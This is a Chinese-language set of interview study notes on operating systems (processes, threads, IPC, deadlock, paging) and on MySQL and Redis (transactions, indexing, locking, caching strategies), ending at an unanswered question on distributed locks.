<p>操作系统<br>    1. 分页和分段有什区别？<br>        分页对程序员是透明的，但是分段需要程序员显式划分每个段。<br>        分页的地址空间是一维地址空间，分段是二维的。<br>        页的大小不可变，段的大小可以动态改变。<br>        分页主要用于实现虚拟内存，从而获得更大的地址空间；分段主要是为了使程序和数据可以被划分为逻辑上独立的地址空间并且有助于共享和保护。</p>
<pre><code>2. 操作系统的四大特性 并发 共享 虚拟 异步
    常见的系统调用:
        getpid/getppid 获取进程号/父进程
        fork/exit 创建新进程/终止进程
        open/creat/close/read/write 对文件的操作
        mkdir/rmdir/rename 创建/删除文件夹/重命名
        pipe 创建管道

3. 进程和线程: (火车和车厢 资源是乘客)
    进程是资源分配的基本单位
    线程是cpu调度的基本单位
    进程有一部分独立资源,一个进程崩溃不会影响其他进程
    线程共享资源,线程崩溃也会导致进程崩溃

    什么是线程: 线程是进程内部的不同的执行路径，是操作系统独立调度的基本单位。一个进程中可以有多个线程，它们共享进程资源。

    线程和进程的区别:
    拥有资源:进程是资源分配的基本单位，但是线程不拥有资源，线程可以访问隶属于进程的资源
    调度:线程是独立调度的基本单位，在同一进程中，线程的切换不会引起进程切换，从一个进程中的线程切换到另一个进程中的线程时，会引起进程切换
    系统开销:进程切换开销大, 线程切换开销小
    通信方面:线程间可以通过直接读写同一进程中的数据进行通信，但是进程通信需要借助IPC

    线程 进程 应用程序 区别/联系
        应用程序通常由多个程序组成。 一个程序就是一个正在执行的进程。 一个程序就是一个进程。

    父进程和子进程的关系
        应该是树行结构 子进程继承的父进程的属性
        关于资源：子进程得到的是除了代码段是与父进程共享的以外，其他所有的都是得到父进程的一个副本，子进程的所有资源都继承父进程，得到父进程资源的副本，既然为副本，也就是说，二者并不共享地址空间。两个是单独的进程，继承了以后二者就没有什么关联了，子进程单独运行。（采用写时复制技术）
        关于文件描述符：继承父进程的文件描述符时，相当于调用了dup函数，父子进程共享文件表项，即共同操作同一个文件，一个进程修改了文件，另一个进程也知道此文件被修改了。

为什么有了线程还要进程?
    进程属于在CPU和系统资源等方面提供的抽象，能够有效提高CPU的利用率。
    线程是在进程这个层次上提供的一层并发的抽象：
        （1）能够使系统在同一时间能够做多件事情；
        （2）当进程遇到阻塞时，例如等待输入，线程能够使不依赖输入数据的工作继续执行
        （3）可以有效地利用多处理器和多核计算机，在没有线程之前，多核并不能让一个进程的执行速度提高
    答案:
    进程只能在一个时间干一件事，如果想同时干两件事或多件事，进程就无能为力了。
    进程在执行的过程中如果阻塞，例如等待输入，整个进程就会挂起，即使进程中有些工作不依赖于输入的数据，也将无法执行。

4. 通讯方式:
    线程: 互斥锁 信号量 临界区
    进程: 共享内存 信号量 管道 消息队列 套接字

    共享内存怎么做?
        创建共享内存
        分配给两个进程(将这个共享内存绑定到自己的地址空间里)
        完成通信后释放

5. 进程死锁:
    互斥: 如果一个资源在一段时间被一个进程占有,那么其他进程要申请这个资源只能等等待
    请求与保持: 进程已经保持了至少一个资源,需要另一个资源,但是该资源被其他进程占有,此时进程被阻塞,自己占有的资源也不会被释放
    非剥夺: 进程所获得的资源未使用完前,不能被其他进程夺走,只能自己释放
    循环等待: 存在进程资源循环等待链

    处理: 
        预防(破坏产生条件) 避免(资源动态分配中防止进入不安全状态) 检测(确定死锁相关的资源) 解除(对死锁相关进程执行撤销或挂起,释放资源)

6. 僵尸进程 孤儿进程
    孤儿: 父进程退出 子进程还在运行,那么这些进程就会成为孤儿,被init进程收养
    僵尸: 子进程的进程描述符在进程退出时不会被释放,只有通过父进程wait()/waitpid()获取后才释放.若没有,子进程的进程描述符仍然在系统中,成为僵尸进程
    守护进程: 是运行在后台的一种特殊进程，它是独立于控制终端的，并周期性地执行某些任务

* 7. 编译有哪些阶段？
    预处理阶段：处理以 # 开头的预处理命令；
    编译阶段：翻译成汇编文件；
    汇编阶段：将汇编文件翻译成可重定位目标文件；
    链接阶段：将可重定位目标文件和 printf.o 等单独预编译好的目标文件进行合并，得到最终的可执行目标文件。

* 8. 堆与栈：
    堆：向上生长，需要程序员申请指明大小，堆分布内存不连续
    栈：先进后出，生中方向向下，系统自动回收分配，但有限制，数据不灵活

9. 用户态和核心态：
    用户态只能受限访问内存
    内核态CPU可以访问所有数据

    用户级线程 有关线程管理的所有工作都由应用程序完成，内核意识不到线程的存在
    内核级线程 有关线程管理的所有工作由内核完成，应用程序没有进行线程管理的代码，只能调用内核线程的接口

    计算机怎么知道是用户态还是核心态?
        看cs段寄存器的后两位(00, 01, 10, 11) 11是用户态 00是核心态

缺页中断?
    进程线性地址空间里的页面不必常驻内存，在执行一条指令时，如果发现他要访问的页没有在内存中（即存在位为0），那么停止该指令的执行，并产生一个页不存在的异常，对应的故障处理程序可通过从外存加载该页的方法来排除故障，之后，原先引起的异常的指令就可以继续执行，而不再产生异常

* 10. 进程私有：地址空间、堆、全 局变量、栈、寄存器
    进程共享：代码段，公共数据，进程目录，进程ID
    线程私有：线程栈，寄存器，程序寄存器
    线程共享：堆，地址空间，全局变量，静态变量

11. 什么是图灵完备
    一切可计算的问题都能计算,这样的虚拟机或者编程语言就叫图灵完备的

12. 并发和并行有什么区别
    并发: 并发就是在一段时间内，多个任务都会被处理；但在某一时刻，只有一个任务在执行。在一段时间内能同时运行多个程序, 
    并行: 在同一时刻，有多个任务在执行。这个需要多核处理器才能完成，在微观上就能同时执行多条指令，不同的程序被放到不同的处理器上运行，这个是物理上的多个进程同时进行。

13. 分时系统和实时系统 区别:
    分时系统: 就是系统把CPU时间分成很短的时间片，轮流地分配给多个作业
    实时系统: 是系统对外部输入的信息，能够在规定的时间内（截止期限）处理完毕并做出反应

14. 静态链接和动态链接有什么区别
    静态链接就是在编译期间，由编译器和连接器将静态库集成到应用程序内，并制作成目标文件以及可以独立运作的可执行文件
    动态链接可以在首次载入的时候执行，也可以在程序开始执行的时候完成。这个是由动态链接器完成

15. 什么是上下文切换
    对于单核单线程CPU而言，在某一时刻只能执行一条CPU指令。上下文切换(Context Switch)是一种将CPU资源从一个进程分配给另一个进程的机制。从用户角度看，计算机能够并行运行多个进程

16. 系统调用和库函数
    系统调用是应用程序向系统内核请求服务的方式
    函数就是说把一些常用的函数编写完放到一个文件里，编写应用程序时调用，这是由第三方提供的，发生在用户地址空间

17. 什么是管道
    管道是半双工的，数据只能向一个方向流动；如果需要双方通信时，需要建立起两个管道。
    管道只能用于父子进程或者兄弟进程之间或者说具有亲缘关系的进程；
    管道对于管道两端的进程而言，就是一个文件，但它不是普通的文件，它不属于某种文件系统，只存在与内存中。
    * 管道的实质是一个内核缓冲区，进程以先进先出的方式从缓冲区存取数据，


    什么是消息队列
    消息队列是消息的链表，具有特定的格式，它是存放在内存里面的，并且每个消息队列都有唯一的标识。消息队列允许一个或多个进程向它写入与读取消息

    什么是共享内存
    共享内存是针对其他通信机制运行效率较低而设计的，它可以让多个进程可以可以直接读写同一块内存空间，是最快的IPC形式。
    为了在多个进程间交换信息，内核专门留出了一块内存区，可以由需要访问的进程将其映射到自己的私有地址空间。进程就可以直接读写这一块内存而不需要进行数据的拷贝，从而大大提高效率。

    什么是信号量
    信号量是一个计数器，可以用来控制多个进程对共享资源的访问

18. 有哪些磁盘调度算法
    先来先服务 最短寻道时间 电梯算法(scan cscan)

19. 页面置换算法
    最佳算法 先来先服务 LRU Clock

    LRU: LRU是最近最少使用页面置换算法(Least Recently Used),也就是首先淘汰最长时间未被使用的页面
    LFU: LFU是最近最不常用页面置换算法(Least Frequently Used),也就是淘汰一定时期内被访问次数最少的页

20. 进程调度
    先来先服务 短作业优先 时间片轮转调度 优先级调度

21. 什么是虚拟内存
    虚拟内存就是说，让物理内存扩充成更大的逻辑内存，从而让程序获得更多的可用内存

22. 什么是分页系统
    分页就是说，将磁盘或者硬盘分为大小固定的数据块，叫做页，然后内存也分为同样大小的块，叫做页框。当进程执行的时候，会将磁盘的页载入内存的某些页框中，并且正在执行的进程如果发生缺页中断也会发生这个过程。页和页框都是由两个部分组成的，一个是页号或者页框号，一个是偏移量。分页一般是有硬件来完成的，每个页都对应一个页框，它们的对应关系存放在一个叫做页表的数据结构中，页号作为这个页表的索引，页框号作为页表的值。操作系统负责维护这个页表

23. 什么是抢占式,什么是非抢占式
    抢占式就是说操作系统将正在运行的进程强行暂停，由调度器将CPU分配给其他就绪进程
    非抢占式是调度器一旦把处理机分配给某进程后便让它一直运行下去，直到进程完成或发生进程调度进程调度某事件而阻塞时，才把处理机分配给另一个进程

24. Linux文件系统
    Linux文件系统里面又目录和文件, 组成一个树状结构,树的每一个叶子节点表示文件或者空目录

25. 硬链接和软链接
    硬链接就是在目录下创建一个条目，记录着文件名与 inode 编号，这个 inode 就是源文件的 inode。删除任意一个条目，文件还是存在，只要引用数量不为0
    符号链接文件保存着源文件所在的绝对路径，在读取时会定位到源文件上，当源文件被删除了，链接文件就打不开了。因为记录的是路径，所以可以为目录建立符号链接

26. 程序的内存分配
    1. 栈区 存放函数的参数值，局部变量的值等
    2. 堆区 一般由程序员分配释放,若程序员不释放,程序结束时可能由OS回收
    3. 全局区 全局变量和静态变量的存储是放在一块的
    4. 文字常量区 常量字符串就是放在这里的
    5. 程序代码区 存放函数体的二进制代码

27. 同步和互斥
    互斥：是指散步在不同任务之间的若干程序片断，当某个任务运行其中一个程序片段时，其它任务就不能运行它们之中的任一程序片段，只能等到该任务运行完这个程序片段后才可以运行。最基本的场景就是：一个公共资源同一时刻只能被一个进程或线程使用，多个进程或线程不能同时使用公共资源。

    同步：是指散步在不同任务之间的若干程序片断，它们的运行必须严格按照规定的某种先后次序来运行，这种先后次序依赖于要完成的特定的任务。最基本的场景就是：两个或两个以上的进程或线程在运行过程中协同步调，按预定的先后次序运行。比如 A 任务的运行依赖于 B 任务产生的数据。
</code></pre>
<p>数据库(MySQL Redis)<br>    * 1. ACID<br>        A(atomicity): 原子性 事务是最小的执行单位,不允许分割.要么都执行,要么都不执行<br>        C(Consistence): 一致性 事务执行前后, 数据保持一致<br>        I(isolation): 隔离性 多个事务并发执行,每个事务修改与其他事务隔离<br>        D(durability): 持久性 事务完成后,对数据库的修改是持久的</p>
<pre><code>* 2. 范式
    1NF 属性不可再分。 是所有关系型数据库的最基本要求
    2NF 2NF在1NF的基础之上，消除了非主属性对于码的部分函数依赖。
    3NF 3NF在2NF的基础之上，消除了非主属性对于码的传递函数依赖。

    函数依赖: 若在一张表中,在属性X的值确定的情况下,必定能确定属性Y的值,那么说Y函数依赖于X,记作y-&gt;x
    部分函数依赖: x-&gt;y x&#39;∈x, x&#39;-&gt;y
    完全函数依赖: x-&gt;y x&#39;∈x, x&#39;!-&gt;y
    传递函数依赖: x-&gt;y y-&gt;z  ==&gt; x-&gt;z

* 3. B/B+ 区别
    相同:
        1. 每个节点最多有m-1个关键字（可以存有的键值对）。
        2. 根节点最少可以只有1个关键字。
        3. 非根节点至少有m/2个关键字。
        4. 每个节点中的关键字都按照从小到大的顺序排列，每个关键字的左子树中的所有关键字都小于它，而右子树中的所有关键字都大于它。
        5. 所有叶子节点都位于同一层，或者说根节点到每个叶子节点的长度都相同。
        6. 每个节点都存有索引和数据，也就是对应的key和value
    不同点:
     1. B树的数据存在于每个节点上,而B+树只存在于叶子节点上.
     2. B+树的所有叶子节点构成了一个链表
     3. B+树的叶子节点只存储key,占用空间小.

     B+-tree的磁盘读写代价更低
     B+-tree的查询效率更加稳定
     数据库索引采用B+树的主要原因是 B树在提高了磁盘IO性能的同时并没有解决元素遍历的效率低下的问题。正是为了解决这个问题，B+树应运而生。B+树只要遍历叶子节点就可以实现整棵树的遍历。而且在数据库中基于范围的查询是非常频繁的，而B树不支持这样的操作

     B树:
         （1）排序方式：所有节点关键字是按递增次序排列，并遵循左小右大原则；
        （2）子节点数：非叶节点的子节点数&gt;1，且&lt;=M ，且M&gt;=2，空树除外（注：M阶代表一个树节点最多有多少个查找路径，M=M路,当M=2则是2叉树,M=3则是3叉）；
        （3）关键字数：枝节点的关键字数量大于等于ceil(m/2)-1个且小于等于M-1个（注：ceil()是个朝正无穷方向取整的函数 如ceil(1.1)结果为2);
        （4）所有叶子节点均在同一层、叶子节点除了包含了关键字和关键字记录的指针外也有指向其子节点的指针只不过其指针地址都为null对应下图最后一层节点的空格子;

    B+树:
        （1）B+跟B树不同B+树的非叶子节点不保存关键字记录的指针，只进行数据索引，这样使得B+树每个非叶子节点所能保存的关键字大大增加；
        （2）B+树叶子节点保存了父节点的所有关键字记录的指针，所有数据地址必须要到叶子节点才能获取到。所以每次数据查询的次数都一样；
        （3）B+树叶子节点的关键字从小到大有序排列，左边结尾数据都会保存右边节点开始数据的指针。
        （4）非叶子节点的子节点数=关键字数（来源百度百科）（根据各种资料 这里有两种算法的实现方式，另一种为非叶节点的关键字数=子节点数-1（来源维基百科)，虽然他们数据排列结构不一样，但其原理还是一样的Mysql 的B+树是用第一种方式实现）;

* 4. RBT/AVL 区别
    平衡度: AVL &gt; RBT
    查找: AVL平均,都为logn, RBT最好logn,最差略大
    插入删除对比: AVL的插入和删除结点很容易造成树结构的不平衡，而RBT的平衡度要求较低。因此在大量数据插入的情况下，RBT需要通过旋转变色操作来重新达到平衡的频度要小于AVL。

    RBT:是一种自平衡二叉查找树，是在计算机科学中用到的一种数据结构，典型的用途是实现关联数组
    插入删除:
        插入的节点置为红,调整红黑树使其满足12345
        删除不会

    红黑树的特性:
    （1）每个节点或者是黑色，或者是红色。
    （2）根节点是黑色。
    （3）每个叶子节点（NIL）是黑色。 [注意：这里叶子节点，是指为空(NIL或NULL)的叶子节点！]
    （4）如果一个节点是红色的，则它的子节点必须是黑色的。
    （5）从一个节点到该节点的子孙节点的所有路径上包含相同数目的黑节点。

6. drop delete truncate 区别
    drop: 直接将表的结构和数据删除
    truncate: 只删除表中数据, 自增id从1开始
    delete: 删除某一行数据, 不加where和truncate类似,但是自增id从删除处开始

    truncate和drop属于ddl(数据定义语言),操作立即生效,不放入rollback segment,不能回滚
    delete是DML(数据操作)语言,操作放入rollback segment中, 事务提交后生效

    速度 drop&gt;truncate&gt;delete

7. 乐观锁和悲观锁
    乐观锁: 总是假设最好的情况,每次去拿数据总认为别人不会修改,所以不上锁,但更新时会判断此期间别人有没有去更新这个数据(版本号机制和CAS算法实现) 这样可提高吞吐量

    ? 什么是版本号机制 一般是在数据表中加上一个数据版本号version字段，表示数据被修改的次数，当数据被修改时，version值会加一
    ? 什么是CAS(Compare And Swap) 无锁算法.比较需要读写内存的值v,进行比较的值a,拟写入的值b,仅当v=a时,CAS才会用b更新v的值(缺点 ABA问题)
    
    悲观锁: 总是假设最坏情况,每次数据总认为别人会修改,所以每次都会上锁,这样别人想拿到这个数据就会阻塞,直到拿到锁

8. MySQL InnoDB 存储引擎的默认支持的隔离级别是 REPEATABLE-READ(可重读)
    READ-UNCOMMITTED(读取未提交) READ-COMMITTED(读取已提交) REPEATABLE-READ(可重读) SERIALIZABLE(可串行化)

    并发事务会带来哪些问题
        脏读(Dirty Read) 当一个事务正在访问数据并且对数据进行了修改，而这种修改还没有提交到数据库中，这时另一个事务也访问了这个数据，然后使用了这个数据.因为这个数据是还没有提交的数据，那么另一个事务读到的这个数据是“脏数据”，依据“脏数据”做的操作是不正确的
        丢失修改(Lost to modify) 指一个事务读取一个数据时，另一个事务也访问了该数据。那么在第一个事务中修改了这个数据后，第二个事务也修改了这个数据。这样第一个事务内的修改结果就被丢失
        不可重读(Unrepeatableread) 指在一个事务内多次读同一数据。在这个事务还没有结束的时，另一个事务也访问该数据。那么，在第一个事务中的两次读数据之间，由于第二个事务的修改导致第一个事务两次读的数据可能不太一样。这就发生了在一个事务内两次读到的数据不一样的情况
        幻读(Phantom read) 它发生在一个事务读取了几行数据，接着另一个并发事务插入了一些数据时。在随后的查询中，第一个事务（T1）就会发现多了一些原本不存在的记录，就好像发生了幻觉一样，所以称为幻读

9. 数据恢复 mysql -u root -p DBname &lt; xx.sql

10. 数据备份 mysqldump -u root -p DBname &gt; 位置 \ xx.sql

11. 索引, 唯一索引
    索引的效率取决于索引值是否散列.
        优点: 提高查询效率,加速表连接, 减少查询中分组排序时间
        缺点: 插入,删除和更新时需要同时维护索引
    ALTER TABLE tbname ADD INDEX idx_xxx(xxx, ...)
    Show index from tbname

建立索引为什么会加快速度？
    首先明白为什么索引会增加速度，DB在执行一条Sql语句的时候，默认的方式是根据搜索条件进行全表扫描，遇到匹配条件的就加入搜索结果集合。如果我们对某一字段增加索引，查询时就会先去索引列表中一次定位到特定值的行数，大大减少遍历匹配的行数，所以能明显增加查询的速度。
    添加索引的话，首先去索引列表中查询，而我们的索引列表是B类树的数据结构，查询的时间复杂度为O(log2N)，定位到特定值得行就会非常快，所以其查询速度就会非常快。

    唯一索引:
        某些列具有唯一约束但由于业务含义不宜作为主键
        唯一索引: ALTER TABLE tbname ADD UNIQUE
        唯一约束: ALTER TABLE tbname ADD CONSTRAINT uni_xxx UNIQUE(xxx)

12. 语句
    增删改查(数据)
        增: INSERT INTO tbname VALUES value
        删: DELETE FROM tbname WHERE ...
            有外键时:1. 创建外键时定义了ON DELETE CASCADE关联数据被自动删除. 2. 没定义会报错
        改: UPDATE tbname SET key=value WHERE    
        查: SELECT XXX FROM XXX WHERE/ORDER BY/BETWEEN/INNER JOIN/...
    主键 PRIMARY KEY xxx
    外键 FOREIGN KEY XXX REFERENCES tbname xxx
        约束  ALTER TABLE tbname
              ADD CONSIRAINT fk_xxx
              FOREIGN KEY XXX REFERENCE tbname xxx
    排序 SELECT * FROM ... ORDER BY XX(ASC/DESC)升/降
    聚合 
        COUNT() 计算某一列行数
        SUM()    计算某一列合
        AVG()    计算某一列均值
        MAX()    计算某一列最大/最小值
        MIN()    字符型返回排最后/最前
    库/表:
        库:
            CREATE DATABASE dbname
            DROP DATABASE dbname
            USE dbname
            SHOW DATABASES
        表:
            SHOW TABLES
            DESC tbname
            SHOW CREATE TABLE tbname
            DROP TABLE tbname
            ALTER TABLE tbname ADD COLUMN 属性名 类型(varchar(10)) 增
            ALTER TABLE tbname DROP COLUMN 属性名 删
            ALTER TABLE tbname CHANGE COLUMN 曾用名 现用名 类型(varchar(10))
    内外连接:
        Inner Join 只返回同时存在的两表的行数据
        Left Outer Join 返回左表存在的行,余下填NULL
        Right Outer Join 返回右表存在的行,余下填NULL
        Full Outer Join 返回两表的全部,并把对方不存在的列填NULL

        On a.xxx = b.xxx

    Limit m,n/Limit n
        Limit n &lt;=&gt; Limit 0, n
        Limit m, n ==&gt;从m+1开始,访问到m+n
    Distinct 只输出不同值
    Group By 根据给定数据列的每个成员对查询结果进行分组统计，最终得到一个分组汇总表
    Having having子句在聚合后对组记录进行筛选
    column = null   (x)
    column is null  (√)
        ==&gt; NULL 是一个特殊值.只能用is 或 not is

13. 什么是数据库,数据库管理系统,数据库系统,数据库管理员
    数据库(DB) 数据的集合
    数据库管理系统(DBMS) 是一种操作和管理数据库的大型软件
    数据库系统(DBS) 由软件 数据库 数据库管理员组成
    数据库管理员(DBA) 负责全面管理和控制数据库系统

14. 什么是元组,码,候选码,主码,外码,主属性,非主属性
    元组: 是关系数据库中的基本概念，关系是一张表，表中的每行（即数据库中的每条记录）就是一个元组，每列就是一个属性。 在二维表里，元组也称为行
    码: 码就是能唯一标识实体的属性，对应表中的列
    候选码: 若关系中的某一属性或属性组的值能唯一的标识一个元组，而其任何、子集都不能再标识，则称该属性组为候选码
    主码: 主码也叫主键.主码是从候选码中选出来的.一个实体集中只能有一个主码,但可以有多个候选码
    外码: 外码也叫外键。如果一个关系中的一个属性是另外一个关系中的主码则这个属性为外码
    主属性:候选码中出现过的属性称为主属性
    非主属性: 包含在任何一个候选码中的属性称为非主属性

15. 主键和外键有什么区别
    主键(主码) 主键用于唯一标识一个元组，不能有重复，不允许为空。一个表只能有一个主键
    外键(外码) 外键用来和其他表建立联系用，外键是另一表的主键，外键是可以有重复的，可以是空值。一个表可以有多个外键

16. 什么是存储过程?
    存储过程是在大型数据库系统中,一组为了完成特定功能的SQL语句集,它存储在数据库中，一次编译后永久有效，用户通过指定存储过程的名字来执行它

17. 数据库设计通常分为哪几步
    需求分析 分析用户的需求，包括数据、功能和性能需求
    概念结构分析 主要采用E-R模型进行设计，包括画E-R图
    逻辑结构分析 通过将E-R图转换成表，实现从E-R模型到关系模型的转换
    物理结构分析 主要是为所设计的数据库选择合适的存储结构和存取路径
    数据库实势 包括编程、测试和试运行
    数据库的运行和维护 系统的运行与数据库的日常维护

索引, 唯一索引
    索引的效率取决于索引值是否散列.
        优点: 提高查询效率,加速表连接, 减少查询中分组排序时间
        缺点: 插入,删除和更新时需要同时维护索引
    ALTER TABLE tbname ADD INDEX idx_xxx(xxx, ...)
    Show index from tbname

建立索引为什么会加快速度？
    首先明白为什么索引会增加速度，DB在执行一条Sql语句的时候，默认的方式是根据搜索条件进行全表扫描，遇到匹配条件的就加入搜索结果集合。如果我们对某一字段增加索引，查询时就会先去索引列表中一次定位到特定值的行数，大大减少遍历匹配的行数，所以能明显增加查询的速度。
    添加索引的话，首先去索引列表中查询，而我们的索引列表是B类树的数据结构，查询的时间复杂度为O(log2N)，定位到特定值得行就会非常快，所以其查询速度就会非常快。

* 5. 什么时候需要索引,什么时候不需要
    需要:
        1. 主键自动建立唯一索引
        2. 频繁作为查询条件字段应创索引
        3. 查询中排序的字段创建索引可加速
        4. 查询中统计或分组字段
    不需要:
        1. 频繁更新的字段/表
        2. where条件用不到的字段
        3. 表的记录比较少
        4. 数据重复且分布平均的字段

18. 什么是索引
    在关系数据库中,有大量数据的情况下,查找记录时要想获得非常快的速度,就需要使用索引
    索引是关系数据库中对一个或多个列进行预排序的数据结构.通过使用索引可让数据库不必扫描整个表,而实直接定位到符合条件的记录,加快查询速度

23. MySQL索引失效
    1.如果条件中有or，即使其中有条件带索引也不会使用(这也是为什么尽量少用or的原因)
    TIPS: (要想使用or，又想让索引生效，只能将or条件中的每个列都加上索引)
    2.对于多列索引，不是使用的第一部分，则不会使用索引
    3.like查询以%开头
    4.如果列类型是字符串，那一定要在条件中将数据使用引号引用起来,否则不使用索引
    5.如果mysql估计使用全表扫描要比使用索引快,则不使用索引


19. 什么是关系,什么是非关系
    关系:由二维表及其联系组成的一个数据组织
        1. 易于维护,使用表结构,格式一致
        2. 使用方便,SQL语言通用,可用于复杂查询
        3. 复杂操作,用多表联合查询
        4. 海量数据读写能力差
        5. 固定表结构,灵活度低
        6. 高并发读写需求, 硬盘I/O为瓶颈
    非关系:由文档,键值对等数据结构化存储方法合集
        1. 格式灵活 存储格式可以是简直u第,图片等形式,应用场景广泛
        2. 速度快 nosql可使用硬盘或内存为载体,而关系数据库只能用硬盘
        3. 高扩展性,成本低(nosql部署简单且开源)
        4. 不提供SQL,学习成本高
        5. 无事务处理
        6. 数据结构复杂

20. MyISAM和InnoDB的区别
    InnoDB支持事务, MyISAM不支持
    InnoDB支持外键, MyISAM不支持
    InnoDB使用聚集索引,MyISAM使用非聚集索引
    InnoDB不保存表的具体行数,MyISAM用一个变量保存了整个表的行数
    InnoDB最小的锁粒度是行级锁, MyISAM是表级锁
    选择? 支持事务--InnoDB 大部分操作是读操作--MyISAM 系统崩溃后MyISAM恢复困难

21. MySQL InnoDB 隔离等级是RR, 但是对幻读进行了优化,怎么做的?
    MVCC(多版本并发控制) 和 间隙锁(gap lock)
    当前读, 快照读
    当前读? 读取的是记录的最新版本,读取时要保证其他并发事务不能修改当前记录,会对读取的记录进行加锁(悲观锁)
    快照读? MVCC(可以理解为行锁的变种),读取到的可能不是最新版本,而可能是之前的版本.

22. 锁
    共享锁/排他锁(读锁/写锁)
    行锁 锁直接加在索引记录上面，锁住的是key
    表锁 对表加锁
    间隙锁 锁定索引记录间隙，确保索引记录的间隙不变
    Next-Key Lock 行锁+间隙锁

23.3 主从复制
    主从复制主要涉及三个线程：binlog 线程、I/O 线程和 SQL 线程。这个过程是靠这三个过程的密切配合来进行的。

    binlog 线程 ：负责将主服务器上的数据更改写入二进制日志（Binary log）中。
    I/O 线程 ：负责从主服务器上读取二进制日志，并写入从服务器的中继日志（Relay log）。
    SQL 线程 ：负责读取中继日志，解析出主服务器已经执行的数据更改并在从服务器中重放（Replay）。

23.6 大表优化
    当MySQL单表记录数过大时，数据库的CRUD性能会明显下降，一些常见的优化措施如下
        1. 限定数据的范围
            务必禁止不带任何限制数据范围条件的查询语句。比如：我们当用户在查询订单历史的时候，我们可以控制在一个月的范围内；

        2. 读/写分离
            经典的数据库拆分方案，主库负责写，从库负责读；

        3. 垂直分区
            根据数据库里面数据表的相关性进行拆分。 例如，用户表中既有用户的登录信息又有用户的基本信息，可以将用户表拆分成两个单独的表，甚至放到单独的库做分库。简单来说垂直拆分是指数据表列的拆分，把一张列比较多的表拆分为多张表

            垂直拆分的优点： 可以使得列数据变小，在查询时减少读取的Block数，减少I/O次数。此外，垂直分区可以简化表的结构，易于维护。
            垂直拆分的缺点： 主键会出现冗余，需要管理冗余列，并会引起Join操作，可以通过在应用层进行Join来解决。此外，垂直分区会让事务变得更加复杂；

        4. 水平分区
            保持数据表结构不变，通过某种策略存储数据分片。这样每一片数据分散到不同的表或者库中，达到了分布式的目的。 水平拆分可以支撑非常大的数据量。

            水平拆分是指数据表行的拆分，表的行数超过200万行时，就会变慢，这时可以把一张的表的数据拆成多张表来存放。举个例子：我们可以将用户信息表拆分成多个用户信息表，这样就可以避免单一表数据量过大对性能造成影响。

            水平拆分可以支持非常大的数据量。需要注意的一点是：分表仅仅是解决了单一表数据过大的问题，但由于表的数据还是在同一台机器上，其实对于提升MySQL并发能力没有什么意义，所以 水平拆分最好分库 。

            水平拆分能够 支持非常大的数据量存储，应用端改造也少，但 分片事务难以解决 ，跨节点Join性能较差，逻辑复杂

24. 银行转账(跨库事务)
    一般来说，就是如果系统不是严格要求缓存和数据库必须一致性的话，缓存可以稍微的跟数据库偶尔有不一致的情况，最好不要做这个方案，可以将读请求和写请求串行化，串到一个内存队列里去，这样就可以保证一定不会出现不一致的情况
    串行化之后，就会导致系统的吞吐量会大幅度的降低，用比正常情况下多几倍的机器去支撑线上的一个请求。

25. Redis
    是什么? Redis是一款内存高速缓存数据库
    可以做什么? (实时类的) 缓存 计数器应用(视频点赞) 消息队列系统
    非关系,单线程,多路i/o复用,集群支持,支持更丰富的数据类型
    Redis不仅仅支持简单的k/v类型(键值对)的数据，同时还提供list，set，zset，hash等数据结构的存储

    redis和mysql? 非关系/关系, 内存/硬盘, 

26. AOF重写
    AOF重写可以产生一个新的AOF文件，这个新的AOF文件和原有的AOF文件所保存的数据库状态一样，但体积更小。在执行 BGREWRITEAOF 命令时，Redis 服务器会维护一个 AOF 重写缓冲区，该缓冲区会在子进程创建新AOF文件期间，记录服务器执行的所有写命令。当子进程完成创建新AOF文件的工作之后，服务器会将重写缓冲区中的所有内容追加到新AOF文件的末尾，使得新旧两个AOF文件所保存的数据库状态一致。最后，服务器用新的AOF文件替换旧的AOF文件，以此来完成AOF文件重写操作。

27. 缓存雪崩和缓存穿透
    缓存雪崩:
        就是缓存同一时间大面积的失效，所以，后面的请求都会落到数据库上，造成数据库短时间内承受大量请求而崩掉。
    解决办法：
        事前：尽量保证整个 Redis 集群的高可用性，发现机器宕机尽快补上。选择合适的内存淘汰策略。
        事中：本地缓存 + Hystrix限流和降级，避免MySQL崩掉。
        事后：利用 Redis 持久化机制保存的数据尽快恢复缓存。

    缓存穿透(当一条数据通过Redis和数据库都没有命中时你是如何处理的，如果它重复发过来你怎么处理?)
        一般是黑客故意去请求缓存中不存在的数据，导致所有的请求都落到数据库上，造成数据库短时间内承受大量请求而崩掉。
    解决办法:
        有很多种方法可以有效地解决缓存穿透问题，最常见的则是采用布隆过滤器，将所有可能存在的数据哈希到一个足够大的bitmap中，一个一定不存在的数据会被 这个bitmap拦截掉，从而避免了对底层存储系统的查询压力。另外也有一个更为简单粗暴的方法（我们采用的就是这种），如果一个查询返回的数据为空（不管是数据不存在，还是系统故障），我们仍然把这个空结果进行缓存，但它的过期时间会很短，最长不超过五分钟

28. Redis过期策略
    惰性删除? key过期的时候不删除，每次从数据库获取key的时候去检查是否过期，若过期，则删除，返回null
    定期删除? 每隔一段时间执行一次删除(在redis.conf配置文件设置hz，1s刷新的频率)过期key操作
    惰性删除 + 定期删除
        惰性删除流程
            在进行get或setnx等操作时，先检查key是否过期，
            若过期，删除key，然后执行相应操作；
            若没过期，直接执行相应操作
        定期删除流程（简单而言，对指定个数个库的每一个库随机删除小于等于指定个数个过期key）
            遍历每个数据库（就是redis.conf中配置的&quot;database&quot;数量，默认为16）
                检查当前库中的指定个数个key（默认是每个库检查20个key，注意相当于该循环执行20次，循环体时下边的描述）
                如果当前库中没有一个key设置了过期时间，直接执行下一个库的遍历
                随机获取一个设置了过期时间的key，检查该key是否过期，如果过期，删除key
                判断定期删除操作是否已经达到指定时长，若已经达到，直接退出定期删除

29. Redis高并发
    具体来看就是(秒杀系统)
    怎么做?
        1. 将请求尽量拦截在系统上游
        2. 充分利用缓存
            (1) 客户端 优化 (比如在查询时,会不自觉地一直点&quot;查询&quot;)
                1. 提交后按钮变灰 2. js限制用户x秒只能提交一次
                缺点:只能拦住普通用户,还有一些人是拦不住的(抓包分析)
            (2) 站点层面的请求拦截 (防止程序员的循环提交)
                拦截? ip?cookie? -&gt; uid(对uid进行请求计数,去重)
                缺点:只能拦住一般程序员,拦不住手里有几万台肉鸡的黑客,使用不同uid去抢.
            (3) 服务层拦截(不让请求落在数据库上)
                对于写请求:请求队列(只有3k, 就透3k请求去db,剩下的丢弃)
                对于读请求:使用cache. redis
            (4) 数据库层 就基本没压力了

30. Redis如何实现分布式锁?原理?
